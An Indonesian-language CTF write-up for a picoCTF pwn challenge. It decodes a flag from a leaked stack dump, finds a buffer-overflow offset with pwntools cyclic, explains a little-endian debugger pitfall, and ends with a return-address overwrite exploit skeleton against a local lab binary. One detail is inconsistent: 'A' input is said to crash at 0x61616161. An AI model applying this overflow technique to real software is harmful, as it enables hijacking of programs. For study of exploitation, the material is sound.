# CTF Write-Up: Pwn - Memory Leak & Buffer Overflow (Endianness Trap)

## Ringkasan Tantangan

Tantangan ini terdiri dari dua fase utama eksploitasi *binary*. Fase pertama melibatkan kebocoran memori (*memory leak*) yang kemungkinan disebabkan oleh kerentanan Format String, memungkinkan kita membaca *flag* langsung dari *stack*. Fase kedua adalah kerentanan Buffer Overflow klasik yang menuntut kita untuk mencari *offset* guna mengambil alih alur eksekusi (EIP/RIP), yang disertai dengan jebakan interpretasi *Little-Endian*.

---

## Tahap 1: Mengungkap Flag dari Memory Leak

Saat berinteraksi dengan program, kita menemukan deretan panjang nilai heksadesimal yang bocor dari memori:

```text
AAAAAAAA.0x96983f0...[snip]...0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x61343762.0x37333164.0xff000a7d...[snip]

```

Nilai-nilai ini sangat mencurigakan karena berada dalam rentang karakter ASCII yang dapat dicetak (*printable*). Karena arsitektur sistem menggunakan **Little-Endian**, kita perlu memecah setiap blok 4-byte menjadi rentang 1-byte, lalu membacanya dari kanan ke kiri.

**Proses Dekode:**

* `0x6f636970` -> `70 69 63 6f` -> **p i c o**
* `0x7b465443` -> `43 54 46 7b` -> **C T F {**
* `0x306c5f49` -> `49 5f 6c 30` -> **I _ l 0**
* `0x345f7435` -> `35 74 5f 34` -> **5 t _ 4**
* `0x6d5f6c6c` -> `6c 6c 5f 6d` -> **l l _ m**
* `0x306d5f79` -> `79 5f 6d 30` -> **y _ m 0**
* `0x5f79336e` -> `6e 33 79 5f` -> **n 3 y _**
* `0x61343762` -> `62 37 34 61` -> **b 7 4 a**
* `0x37333164` -> `64 31 33 37` -> **d 1 3 7**
* `0xff000a7d` -> `7d 0a 00 ff` -> **}**

**Flag Pertama Ditemukan:**
`picoCTF{I_l05t_4ll_my_m0n3y_b74ad137}`

---

## Tahap 2: Buffer Overflow & Mencari Offset

Setelah mendapatkan *flag* dari *leak*, kita mengeksplorasi eksekusi program `19` (atau `29`). Program meminta input string, dan memberikan *feedback* arah lompatan eksekusi (*Jumping to...*).

Saat diberikan input panjang berupa `A` berulang (buffer 300 karakter), program mengalami *crash* (SIGSEGV) pada alamat `0x61616161` (`aaaa`). Ini adalah konfirmasi mutlak adanya celah Buffer Overflow.

Untuk mencari jarak pasti (*offset*) dari awal input hingga ke *Return Address* (EIP/RIP), kita menggunakan *cyclic pattern* dari `pwntools`:

```bash
$ cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

```

Saat *pattern* tersebut diinputkan ke program melalui *vanilla* GDB di *server*, program *crash* pada alamat:
**`0x61617362`**

---

## Tahap 3: Jebakan Little-Endian (Pelajaran Penting)

Di sinilah letak jebakan analisis *debugging* terjadi. Saat mencoba mencari *offset* dengan menerjemahkan alamat *crash* `0x61617362` langsung menjadi `aasb`, *tool* `cyclic` memberikan nilai *offset* yang tidak masuk akal, yaitu **1801**. Padahal, total input kita hanya 300 karakter!

**Akar Masalah:**
Terdapat perbedaan representasi visual antara menggunakan *debugger* canggih seperti `pwndbg` di mesin lokal dan Vanilla GDB di *server*.

* `pwndbg` secara otomatis membalikkan urutan *byte* memori dari *Little-Endian* ke format manusia.
* Vanilla GDB mencetak nilai memori mentah tepat seperti apa yang disimpan oleh register komputer.

Nilai EIP `0x61617362` diterjemahkan secara visual (dari kiri ke kanan) sebagai `aasb`. Namun, arsitektur *Little-Endian* menyimpan *byte* terkecil di depan. Artinya, urutan karakter yang sebenarnya ditangkap oleh EIP dari *input buffer* kita adalah membaca dari kanan ke kiri: **`b s a a`**.

Mencari posisi string yang benar:

```python
from pwn import *

# p32 akan menangani konversi Little-Endian secara otomatis
crash_address = 0x61617362
offset = cyclic_find(p32(crash_address)) # p32(0x61617362) menghasilkan b'bsaa'

print(f"Correct Offset: {offset}")

```

**Hasil:**
Offset yang benar adalah **171**.

---

## Kesimpulan & Skeleton Exploit

Dengan mengetahui *offset* yang presisi (171 byte), kita sekarang memiliki kendali penuh atas alur eksekusi program. Kesalahan interpretasi *output debugger* adalah hal yang sangat wajar terjadi saat berpindah lingkungan (*local* vs *remote*).

Sebagai referensi, berikut adalah kerangka eksploitasi final menggunakan Python dan `pwntools` untuk membajak program:

```python
from pwn import *

# Konfigurasi target
target_binary = './29'
p = process(target_binary)

# Alamat fungsi yang ingin dituju (contoh: fungsi 'win' atau alamat shellcode)
# Ganti dengan alamat yang relevan dari hasil analisa `objdump` atau `gdb`
target_address = 0x08041234 # CONTOH ALAMAT

offset = 171

# Menyusun payload
# [Padding sebanyak 171 karakter] + [Alamat Target dalam format Little-Endian]
payload = b"A" * offset
payload += p32(target_address) 

# Mengirim payload
p.recvuntil(b"Please enter your string:")
p.sendline(payload)

# Masuk ke mode interaktif
p.interactive()

```
